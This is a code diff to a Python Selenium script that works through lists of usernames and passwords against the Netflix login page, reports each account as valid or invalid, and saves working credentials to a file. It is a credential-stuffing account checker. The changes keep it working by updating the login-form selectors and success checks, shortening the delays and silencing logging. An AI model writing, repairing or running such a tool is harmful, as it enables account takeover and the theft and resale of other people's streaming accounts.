@@ -1,3 +1,4 @@
+import logging
 import time
 import requests
 import os
@@ -94,6 +95,7 @@ for file_ in range(len(files)):
 
 page = "https://www.netflix.com/login"
 while True:
+	logging.getLogger().setLevel(logging.CRITICAL)
 	counter =0
 	title()
 	print(current_split_method)
@@ -130,8 +132,8 @@ while True:
 														  '//*[@id="appMountPoint"]/div/div/div[2]/div/form/button[2]')
 							button.click()
 					time.sleep(0.7)
-					login = browser.find_element(By.XPATH, '//input[@type="email"]')
-					password = browser.find_element(By.XPATH, '//input[@type="password"]')
+					login = browser.find_element(By.XPATH, '//input[@name="userLoginId"]')
+					password = browser.find_element(By.XPATH, '//input[@name="password"]')
 					login.send_keys(user[counter])
 					time.sleep(0.7)
 					password.send_keys(passw[counter].strip())
@@ -139,10 +141,10 @@ while True:
 					action = ActionChains(browser)
 					password.send_keys(Keys.TAB)
 					password.send_keys(Keys.ENTER)
-					time.sleep(3)
-					if browser.current_url == 'https://www.netflix.com/login' or browser.find_element(By.XPATH, '//div[@role="alert"]'):
+					time.sleep(0.7)
+					if browser.current_url == 'https://www.netflix.com/login' or browser.find_element(By.XPATH, '//div[@id="loginErrorMessage"]'):
 						print("\033[38;5;196m Invalid Account",end='')
-					if browser.find_element(By.XPATH, '//div[@class="profiles-gate-container"]'):
+					if browser.current_url == 'https://www.netflix.com/browse' or browser.find_elements(By.XPATH, '//div[@class="profiles-gate-container"]'):
 						print("\033[38;5;46m Valid Account - Stored",end='')
 						hits += 1
 						with open('valid','a') as valid:
@@ -169,15 +171,11 @@ while True:
 				browser.close()
 				sys.stdout.write("\033[38;5;7m\x1b7\x1b[0;14fHits: %s Valid Accounts (Tried %s out of %s)\x1b8"%(hits, str(counter), str(len(user))))
 				sys.stdout.flush()
-
-
 			print("\n\033[38;5;226mAll done.")
 			input("\n\033[38;5;226mPress Enter.")
-			
 			if resume_flag == True:
 				os.remove('resume')
 			break
-			
 		if options == "2":		
 			#Countries List in File and Stats
 			if return_split_method:
